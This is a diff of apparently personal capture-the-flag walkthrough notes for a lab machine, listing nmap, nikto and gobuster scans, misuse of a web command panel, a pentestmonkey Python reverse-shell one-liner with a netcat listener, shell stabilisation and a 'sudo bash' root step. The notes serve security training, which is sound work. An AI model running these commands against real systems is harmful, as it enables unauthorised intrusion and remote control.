@@ -17,42 +17,42 @@ export IP=10.10.200.202 (IP will change), but will be useful to not have rewrite
 
 
 3. nmap scan IP address 
-    - nmap -v2 -sC -sV -oN nmap_scap.log $IP
+    - `nmap -v2 -sC -sV -oN nmap_scap.log $IP`
 
 
 4. Run a nikto scan and log it
-   - nikto -h http://$IP | tee nikto_scan.log 
+   - `nikto -h http://$IP | tee nikto_scan.log `
    - Check out robots.txt, if it has one
 
 
 5. Run gobuster
-   - gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,py | tee gobuster_scan.log
+   - `gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,py | tee gobuster_scan.log`
    - there is a login page 
 
 
 6. Command panel is shown, try out commands
-    - grep pattern filename -> grep . file.txt
+    - `grep pattern filename -> grep . file.txt`
     OR
-    - while read line; do echo $line; done < clue.txt
+    - `while read line; do echo $line; done < clue.txt`
 
 
 7. with access to a command line, lets set up a reverse shell
    - using python or netcat
-   - python3 -c "print('hello')"
+   - `python3 -c "print('hello')"`
 
 
 8. use pentestmonkey to create a reverse shell with
    - pentestmonkey.net
-   - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-   - nc -lnvp 9999
+   - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+   - `nc -lnvp 9999`
 
 
 9.  stabalize reverse shell
-   - /usr/bin/script -qc /bin/bash /dev/null
+   - `/usr/bin/script -qc /bin/bash /dev/null`
 
 
 10. try to become root and snoop
-   - sudo bash
+   - `sudo bash`
 
 # nmap_results
 
